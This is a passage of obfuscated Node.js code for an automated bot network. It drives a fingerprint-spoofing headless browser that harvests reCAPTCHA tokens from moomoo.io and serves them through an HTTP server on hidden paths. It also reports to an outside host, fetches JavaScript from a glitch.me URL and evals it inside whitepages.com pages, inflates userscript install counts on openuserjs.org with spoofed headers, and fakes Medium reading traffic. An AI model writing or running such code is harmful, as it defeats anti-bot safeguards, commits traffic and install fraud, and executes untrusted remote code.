      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + W(0x1b) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + T(0x4) + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + U(0xb, 'VzzM') + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + W(0x16) + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2b * -0x27 + -0xcb1 * -0x2 + 0x1 * -0x12d5
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x216b + -0x257 + 0x23c2);
    let h = e[f];
    if (c['TqWWdC'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x6a4 + 0x607 * -0x3 + 0x18b9, r, s, t = 0x2589 + -0xc5 * -0x11 + -0x329e; s = m['charAt'](t++); ~s && (r = q % (-0x4cd * -0x4 + 0x5 * 0x311 + -0x2285) ? r * (0xd61 * -0x1 + -0x6b * -0x5b + -0x1868) + s : s, q++ % (-0xf * -0x1a2 + -0x6b * 0x2b + 0x6f * -0xf)) ? o += String['fromCharCode'](-0x908 + -0x19ed + 0x23f4 & r >> (-(-0x10 * -0xa6 + -0x2 * -0x3db + -0x59 * 0x34) * q & -0x8e3 + 0xd8c + -0x4a3)) : 0x557 + 0x205a + 0x1 * -0x25b1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x12c2 + 0x258d + -0x12cb, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1ced * -0x1 + 0x1 * 0x20fc + -0x3ff))['slice'](-(-0x7b5 + 0x1816 + -0x105f));
        }
        return decodeURIComponent(p);
      };
      c['iKYqjd'] = i, b = arguments, c['TqWWdC'] = !![];
    }
    const j = e[-0x5b * 0x29 + -0x860 + 0x7d * 0x2f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['iKYqjd'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2245 + 0xdd0 + 0x1475)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1464 + -0x6 * -0x557 + -0x340a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x683 + -0x1f * -0xf7 + -0x1702), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1c94 * 0x1 + -0x15 * 0x1cf + 0x1 * 0x967;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1b92 + 0x2f6 * -0x9 + -0x2 * 0x76; w < getRandomInt(-0x13 * -0x59 + -0xbbd + 0x523, -0x1 * -0x4bd + -0x1fc3 + 0x1b0b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xc2e7 * -0x1 + 0x1b1c9 + -0x1 * 0x18a50);
        }
      }();
    }, 0xdf * 0x22 + -0x33c * -0x9 + -0x1d2b * 0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const X = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x5 * -0x285 + 0x1b45 + -0x272 * 0x6;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + X(0x18)))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1279 * -0x1 + -0x2a5 * 0x1 + -0xfd4, -0x8b * 0x16 + -0x2d + 0x41b * 0x3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x11c9 * -0x1 + 0x4d * -0x3 + 0x87e0);
    }, -0x2 * -0x1105 + 0x26eb + 0x1 * -0x4891), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x165d + 0x1 * 0x1395 + 0x2c8 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1d04 + 0x31 * 0x35 + -0x29 * -0xbf), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1763 + -0x1867 + 0x104), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x192687 + 0x88a * -0xfe + 0xfb * -0x301);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xc94 + -0x685 * 0x2 + 0xda);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1a5b * -0x1 + -0xcbb + 0x27de);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x394b * -0x1 + 0x1150 + -0x2b0b);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b;
  async function f() {
    const Z = c,
      Y = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xb3 * -0x17 + -0x893 + -0x781) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x93b * 0x1 + 0x1d63 * 0x1 + -0x43 * 0x4d));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x12be + 0x1b01 * 0x1 + -0x2dbf, D['indexOf']('\x20'));
        return B ? E['slice'](0x102f + 0x1 * -0x19e9 + -0x1 * -0x9ba, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x11cc + 0x1364 + -0x2 * -0xf0),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + Y(0x1c, '*&ZO') + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x271 * -0x2 + 0x1 * -0x3099 + 0x5c8b),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y[Z(0x14)], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x0, 'uu[b') + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + a1(0x2) + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + a0(0x1d, 'Psm8') + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * 0x100f + 0x9 * -0x45 + -0x34 * -0x5b; k < -0x5 * -0x57f + 0x22ad + -0x4 * 0xf89; k++)
    setTimeout(f, (-0x16f9 * -0xd + 0xfe0f + -0x13e54) * k * getRandomInt(0x1 * 0x17e1 + -0x1e4f + 0x66f, 0x5ea * -0x3 + -0x29 * -0x95 + -0x61c));
  setInterval(() => {
    f();
